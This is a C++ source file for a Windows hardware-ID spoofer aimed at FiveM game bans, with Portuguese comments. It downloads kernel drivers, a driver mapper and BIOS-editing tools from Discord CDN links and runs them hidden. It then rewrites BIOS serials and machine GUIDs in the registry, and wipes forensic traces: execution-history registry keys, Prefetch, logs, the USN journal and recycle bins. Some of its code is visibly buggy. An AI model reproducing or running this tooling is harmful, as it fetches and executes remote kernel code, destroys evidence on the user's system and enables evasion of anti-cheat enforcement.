#include <iostream>
#include <urlmon.h>
#include <direct.h>
#include <skStr.h>
#include <random>
#include <wininet.h>
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "urlmon.lib")

namespace {
	std::string const default_chars =
		"abcdefghijklmnaoqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
}

std::string random_string(size_t len = 15, std::string const& allowed_chars = default_chars) {
	std::mt19937_64 gen{ std::random_device()() };

	std::uniform_int_distribution<size_t> dist{ 0, allowed_chars.length() - 1 };

	std::string ret;

	std::generate_n(std::back_inserter(ret), len, [&] { return allowed_chars[dist(gen)]; });
	return ret;
}

void XKRJNTPMDGQD()
{
	system(skCrypt("cls"));
	system(skCrypt("mode 60,20"));
	std::cout << "\n" << R"(
	   	   /\                 /\
		  / \'._   (\_/)   _.'/ \
		  |.''._'--(o.o)--'_.''.|
		   \_ / `;=/ " \=;` \ _/
		     `\__| \___/ |__/`
		          \(_|_)/
		           " ` "                
	)" << '\n';
	std::cout << skCrypt("\n	Please wait, your system will be spoofed.");
	Sleep(2500);

	// Verificando se há conexão com a internet.
	char url[128];
	strcat(url, "https://www.google.com/");
	bool bConnect = InternetCheckConnection(url, FLAG_ICC_FORCE_CONNECTION, 0);

	if (bConnect)
	{
		// Próxima etapa.
	}
	else
	{
		system(skCrypt("cls"));
		std::cout << skCrypt("\n No internet connection.");
		Sleep(2500);
		abort();
	}

	// Download de todos arquivos!!
	if (_mkdir("C:\\ProgramData\\USODrivers") == -1)
	// Download de todos arquivos .sys
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628546319061152/1.sys", "C:\\ProgramData\\USODrivers\\QNRVFKRZLLIU.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628546679767090/2.sys", "C:\\ProgramData\\USODrivers\\JWBQTQNQMCEY.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628546998538421/3.sys", "C:\\ProgramData\\USODrivers\\YSAPBUSWYIIL.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628547371827260/4.sys", "C:\\ProgramData\\USODrivers\\UNYQOMJVKVJD.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628547732541551/5.sys", "C:\\ProgramData\\USODrivers\\KBEARJQNCHMY.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628544339345598/6.sys", "C:\\ProgramData\\USODrivers\\EUIPJSHHFYZX.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628544687493160/7.sys", "C:\\ProgramData\\USODrivers\\STPWJWYERJZR.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628545098518528/8.sys", "C:\\ProgramData\\USODrivers\\GMLALPWSXWXH.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628545492779158/9.sys", "C:\\ProgramData\\USODrivers\\JENCTLDFHMAY.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628545920618606/10.sys", "C:\\ProgramData\\USODrivers\\HJHVDXALXMVX.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628575125553163/11.sys", "C:\\ProgramData\\USODrivers\\KGFXNQACUPUW.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628575523995669/12.sys", "C:\\ProgramData\\USODrivers\\YYRNTIGJZIMB.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628575888920586/13.sys", "C:\\ProgramData\\USODrivers\\GJYMORUSWAPH.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628576228655154/amide.sys", "C:\\ProgramData\\USODrivers\\amide.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628573502361691/amifldrv64.sys", "C:\\ProgramData\\USODrivers\\amifldrv64.sys", 0, NULL);
	// Download de todos arquivos .exe & .bat
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628574362173501/Ligthmapper.exe", "C:\\ProgramData\\USODrivers\\Ligthmapper.exe", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628573141631086/AMIDEWINx64.exe", "C:\\ProgramData\\USODrivers\\AMIDEWINx64.exe", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628574764847184/oi.exe", "C:\\ProgramData\\USODrivers\\ZUECDTVIAQLY.exe", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628574022451300/beta.bat", "C:\\ProgramData\\USODrivers\\YSWQBBEJWGPF.bat", 0, NULL);
}

void OICXSXOPZFAK()
{
	system(skCrypt("mode 60,20"));
	// Finalizando tarefas relacionadas ao FiveM
	system(skCrypt("taskkill /f /im Steam.exe >nul 2>nul"));
	system(skCrypt("taskkill /f /im FiveM_b2372_GTAProcess.exe.exe >nul 2>nul"));
	system(skCrypt("taskkill /f /im FiveM_b2699_GTAProcess.exe >nul 2>nul"));
	system(skCrypt("taskkill /f /im FiveM_SteamChild.exe >nul 2>nul"));
	system(skCrypt("taskkill /f /im FiveM.exe >nul 2>nul"));
	system(skCrypt("taskkill /f /im EpicGamesLauncher.exe >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);
	
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe QNRVFKRZLLIU.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe JWBQTQNQMCEY.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe YSAPBUSWYIIL.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe UNYQOMJVKVJD.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe KBEARJQNCHMY.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe EUIPJSHHFYZX.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe STPWJWYERJZR.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start ZUECDTVIAQLY.exe GMLALPWSXWXH.sys >nul 2>nul"));
	
	system(skCrypt("cls"));
	Sleep(1500);

	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper QNRVFKRZLLIU.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper JWBQTQNQMCEY.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper YSAPBUSWYIIL.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper UNYQOMJVKVJD.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper KBEARJQNCHMY.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper EUIPJSHHFYZX.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper STPWJWYERJZR.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper GMLALPWSXWXH.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper JENCTLDFHMAY.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper HJHVDXALXMVX.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper KGFXNQACUPUW.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper YYRNTIGJZIMB.sys >nul 2>nul"));
	system(skCrypt("cd C:\\ProgramData\\USODrivers & start Ligthmapper GJYMORUSWAPH.sys >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Mudança dos seriais do pc.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /SU AUTO >nul 2>nul")); // Read/Write System UUID in Type 1.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /IVN %random%%random% >nul 2>nul")); // Read/Write BIOS vendor name in Type 0.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /IV  %random%%random% >nul 2>nul")); // Read/Write BIOS version in Type 0.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /ID  %random%%random% >nul 2>nul")); // Read/Write BIOS release date in Type 0.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /SM  %random%%random% >nul 2>nul")); // Read/Write System manufacture in Type 1.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /SP  %random%%random% >nul 2>nul")); // Read/Write System product in Type 1.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /BS  %random%%random% >nul 2>nul")); // Read/Write Baseboard Serial number in Type 2.
	system(skCrypt("cd C:\\ProgramData\\USODrivers & AMIDEWINx64.exe /SS  %random%%random% >nul 2>nul")); // Read/Write System Serial number in Type 1.

	system(skCrypt("cls"));
	Sleep(1500);

	std::string HwGuildRandom = random_string(12, "abcdefghijklmnopqrstuvwxyz123456789");
	std::string FunctionCmd = "/C REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001\" /f /v HwProfileGuid /t REG_SZ /d {1b7803eb-da69-11ea-a112-";
	std::string LesDeux = FunctionCmd + HwGuildRandom + "}";
	ShellExecuteA(0, "open", "cmd.exe", LesDeux.c_str(), 0, SW_HIDE);
	//----------------------//
	//	    Fonction2   	//
	//----------------------//
	std::string MachineRandom = random_string(12, "abcdefghijklmnopqrstuvwxyz123456789");
	std::string MachineFonction = "/C REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /f /v MachineGuid /t REG_SZ /d ValeurTest"; // Maybe it's work with 16 bit idk
	std::string FonctionContribue = MachineFonction + MachineRandom;
	ShellExecuteA(0, "open", "cmd.exe", FonctionContribue.c_str(), 0, SW_HIDE); // Execute fonction invalid and it's work
	//----------------------//
	//	    Fonction3   	//
	//----------------------//
	std::string macrandom = random_string(12, "abcdefghijklmnopqrstuvwxyz123456789");
	std::string macfonction = "/C REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0001 /f /v MachineGuid /t REG_SZ /d ValeurTest"; // Maybe it's work with 16 bit idk
	std::string DoubleFonction = MachineFonction + MachineRandom;
	ShellExecuteA(0, "open", "cmd.exe", FonctionContribue.c_str(), 0, SW_HIDE); // Execute fonction for change mac but i dont if work with 16 byte bcs on 16 byte mac change evertime

	system(skCrypt("cls"));
	Sleep(1500);

	system(skCrypt("net stop winmgmt /y >nul 2>nul"));
	system(skCrypt("net start winmgmt /y >nul 2>nul"));
	system(skCrypt("sc stop winmgmt >nul 2>nul"));
	system(skCrypt("sc start winmgmt >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Deletando arquivos de configuração do FiveM & deslogando conta ativa.
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\data\\cache >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\data\\server-cache >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\data\\nui-storage >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\data\\server-cache >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\data\\server-cache-priv >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\crashes >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\logs >nul 2>nul"));
	system(skCrypt("del /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\CitizenFX.ini >nul 2>nul"));
	system(skCrypt("del /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\cef_console.txt >nul 2>nul"));
	system(skCrypt("del /s /q \"C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\favorites.json >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Roaming\\CitizenFX >nul 2>nul"));
	system(skCrypt("/C rmdir /s /q \"C:\\Users\\%username%\\AppData\\Local\\DigitalEntitlements >nul 2>nul"));
	system(skCrypt("/C cd C:\\Users\\%username%\\Saved Games\\ && rmdir /s /q .\\CitizenFX >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Executando cleaner externo (.bat sem ofuscação (código aberto)).
	system(skCrypt("start C:\\ProgramData\\USODrivers\\YSWQBBEJWGPF.bat >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Limpando registros
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\WinRAR\ArcHistory /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\7-Zip\FM /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing\HardwareID /f >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing\Store /f >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\MicrosoftWindows\CurrentVersion\Explorer\RecentDocs /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs.dll /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\WinRAR\DialogEditHistory\ExtrPath /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs.dll /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CLASSES_ROOT\Applications Computador\HKEY_CURRENT_USER\SOFTWARE\WinRAR /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts.dll\OpenWithList /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam /F >nul 2>nul"));
	system(skCrypt("REG DELETE HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU /F >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Deletando arquivos temporários
	system(skCrypt("RMDIR %tmp% /S /Q >nul 2>nul"));
	system(skCrypt("del /s /f /q %temp%\*.* >nul 2>nul"));
	system(skCrypt("del /s /f /q %windir%\temp\*.* >nul 2>nul"));
	system(skCrypt("del /s /f /q %windir%\Prefetch\*.* >nul 2>nul"));
	system(skCrypt("del /s /f /q %LOCALAPPDATA%\Microsoft\Windows\Caches\*.* >nul 2>nul"));
	system(skCrypt("del /s /f /q %windir%\SoftwareDistribution\Download\*.* >nul 2>nul"));
	system(skCrypt("del /s /f /q %programdata%\Microsoft\Windows\WER\Temp\*.* >nul 2>nul"));
	system(skCrypt("del /s /f /q %HomePath%\AppData\LocalLow\Temp\*.* >nul 2>nul"));
	system(skCrypt("rd /s /f /q %windir%\history >nul 2>nul"));
	system(skCrypt("rd /s /f /q %windir%\cookies >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Deletando aruivos de logs.
	system(skCrypt("del /s /f /q %windir%\Logs\CBS\CbsPersist*.log >nul 2>nul"));
	system(skCrypt("del /s /f /q %windir%\Logs\MoSetup\*.log >nul 2>nul"));
	system(skCrypt("del /s /f /q %windir%\Panther\*.log >nul 2>nul"));
	system(skCrypt("del /s /f /q %windir%\logs\*.log >nul 2>nul"));
	system(skCrypt("del /s /f /q %localappdata%\Microsoft\Windows\WebCache\*.log >nul 2>nul"));
	system(skCrypt("rd /s /f /q %localappdata%\Microsoft\Windows\INetCache\*.log >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Deletando $Recycle.Bin
	system(skCrypt("rd /q /s %systemdrive%\$Recycle.Bin >nul 2>nul"));
	system(skCrypt("rd /q /s d:\$Recycle.Bin >nul 2>nul"));
	system(skCrypt("rd /q /s e:\$Recycle.Bin >nul 2>nul"));
	system(skCrypt("rd /q /s f:\$Recycle.Bin >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(1500);

	// Clean DNS Resolver Cache (Restart May Be Required)
	system(skCrypt("ipconfig /release >nul 2>nul"));
	system(skCrypt("ipconfig /renew >nul 2>nul"));
	system(skCrypt("ipconfig /flushdns >nul 2>nul"));
	system(skCrypt("netsh int ip reset >nul 2>nul"));
	system(skCrypt("netsh winsock reset >nul 2>nul"));
	system(skCrypt("netsh winsock reset catalog >nul 2>nul"));
	system(skCrypt("netsh interface ipv4 reset >nul 2>nul"));
	system(skCrypt("netsh interface ipv6 reset >nul 2>nul"));
	system(skCrypt("netsh int ipv4 reset reset.log >nul 2>nul"));
	system(skCrypt("netsh int ipv6 reset reset.log >nul 2>nul"));

	system(skCrypt("cls"));
	Sleep(2500);
}

void VLNNKUUVKTUP()
{
	system(skCrypt("mode 60,20"));
	system(skCrypt("rmdir /s /q C:\\ProgramData\\USODrivers"));
	system(skCrypt("fsutil usn deletejournal /d /c:"));
	system(skCrypt("fsutil usn deletejournal /d /d:"));
	system(skCrypt("cls"));
    std::cout << R"(
            .-"-.            .-"-.          .-"-.
          _/_-.-_\_        _/.-.-.\_      _/.-.-.\_
         / __} {__ \      /|( o o )|\    ( ( o o ) )
        / //  "  \\ \    | //  "  \\ |    |/  "  \|
       / / \'---'/ \ \  / / \'---'/ \ \    \ .-. /
       \ \_/`"""`\_/ /  \ \_/`"""`\_/ /    /`"""`\
        \           /    \           /    /       \
		)" << '\n';
	std::cout << skCrypt("\n		 System spoofed successfully.");
	Sleep(4500);
	exit(0);
}
